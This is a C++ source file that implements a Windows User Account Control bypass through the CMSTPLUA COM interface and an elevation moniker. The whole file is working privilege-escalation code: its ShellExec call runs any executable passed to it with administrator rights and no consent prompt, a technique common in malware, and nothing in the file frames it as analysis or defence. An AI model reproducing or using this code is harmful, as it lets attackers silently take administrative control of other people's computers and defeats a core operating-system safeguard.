#include "stdafx.h"
#include "BypassUAC.h"

namespace
{
	class CoInitGuard
	{
	public:
		CoInitGuard()
			: m_result(::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED)),
			  m_shouldUninitialize(SUCCEEDED(m_result))
		{
			if (m_result == RPC_E_CHANGED_MODE)
			{
				// COM already initialized on this thread with a different model.
				m_result = S_OK;
				m_shouldUninitialize = false;
			}
		}

		~CoInitGuard()
		{
			if (m_shouldUninitialize)
			{
				::CoUninitialize();
			}
		}

		HRESULT Result() const
		{
			return m_result;
		}

	private:
		HRESULT m_result;
		bool m_shouldUninitialize;
	};

	HRESULT BuildElevationMonikerName(REFCLSID rclsid, _Out_writes_(monikerLength) LPWSTR monikerName, size_t monikerLength)
	{
		if (!monikerName || monikerLength == 0)
		{
			return E_INVALIDARG;
		}

		WCHAR clsidBuffer[MAX_PATH] = { 0 };
		const int charsWritten = ::StringFromGUID2(rclsid, clsidBuffer, _countof(clsidBuffer));
		if (charsWritten == 0)
		{
			return E_FAIL;
		}

		return ::StringCchPrintfW(monikerName, monikerLength, L"Elevation:Administrator!new:%s", clsidBuffer);
	}
}


HRESULT CoCreateInstanceAsAdmin(HWND hWnd, REFCLSID rclsid, REFIID riid, PVOID *ppVoid)
{
	if (!ppVoid)
	{
		return E_POINTER;
	}

	*ppVoid = nullptr;

	CoInitGuard com;
	HRESULT hr = com.Result();
	if (FAILED(hr))
	{
		return hr;
	}

	WCHAR monikerName[MAX_PATH] = { 0 };
	hr = BuildElevationMonikerName(rclsid, monikerName, _countof(monikerName));
	if (FAILED(hr))
	{
		return hr;
	}

	BIND_OPTS3 bindOptions = { 0 };
	bindOptions.cbStruct = sizeof(bindOptions);
	bindOptions.hwnd = hWnd;
	bindOptions.dwClassContext = CLSCTX_LOCAL_SERVER;

	return ::CoGetObject(monikerName, &bindOptions, riid, ppVoid);
}


BOOL CMLuaUtilBypassUAC(LPCWSTR lpwszExecutable)
{
	if (!lpwszExecutable || *lpwszExecutable == L'\0')
	{
		return FALSE;
	}

	CLSID clsidICMLuaUtil = { 0 };
	IID iidICMLuaUtil = { 0 };

	HRESULT hr = ::CLSIDFromString(CLSID_CMSTPLUA, &clsidICMLuaUtil);
	if (FAILED(hr))
	{
		return FALSE;
	}

	hr = ::IIDFromString(IID_ICMLuaUtil, &iidICMLuaUtil);
	if (FAILED(hr))
	{
		return FALSE;
	}

	ICMLuaUtil *cmluaUtil = nullptr;
	hr = CoCreateInstanceAsAdmin(nullptr, clsidICMLuaUtil, iidICMLuaUtil, reinterpret_cast<PVOID *>(&cmluaUtil));
	if (FAILED(hr) || !cmluaUtil)
	{
		return FALSE;
	}

	hr = cmluaUtil->lpVtbl->ShellExec(cmluaUtil, lpwszExecutable, nullptr, nullptr, 0, SW_SHOW);

	cmluaUtil->lpVtbl->Release(cmluaUtil);

	return SUCCEEDED(hr);
}